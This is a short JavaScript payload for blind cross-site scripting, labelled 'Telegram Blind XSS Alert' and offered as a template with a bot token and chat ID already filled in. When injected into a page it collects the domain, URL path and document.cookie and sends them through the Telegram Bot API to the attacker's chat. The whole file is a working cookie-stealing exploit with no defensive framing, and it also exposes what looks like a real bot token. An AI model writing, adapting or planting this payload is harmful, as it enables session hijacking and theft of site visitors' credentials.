var tokenBot = '6864746853:AAGZH1DLZaNm7OOQdi-Ab3lA5TqEgjFWz3s'; // Your "tokenBot" Here
var chatId = '6776684568'; // Your "chatId" Here

/*
	    _____    _     __   __  ___  
	   |_   _|  | |    \ \ / / / _ \ 
	     | | ___| | ___ \ V / / /_\ \
	     | |/ _ \ |/ _ \/   \ |  _  |
	     | |  __/ |  __/ /`\ \| | | |
	     \_/\___|_|\___\/   \/\_| |_/
	 ---- Telegram Blind XSS Alert ----
*/

function telegramSend(tokenBot, chatId) {
	var textData = '<b>XSS+Alert+in+' + document['domain']+'</b>%0d%0a------------------------------------------------%0d%0a%0d%0a<b>-+URL+Target+-</b>%0d%0a<pre>' + document['location']['hostname'] + document['location']['pathname'] + '</pre>%0d%0a%0d%0a<b>-+Document+Cookie+-</b>%0d%0a<pre>' + document['cookie'] + '</pre>';
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://api.telegram.org/bot' + tokenBot + '/sendMessage?chat_id=' + chatId + '&text=' + textData + '&parse_mode=html', true);
    xhr.send();
}
telegramSend(tokenBot, chatId)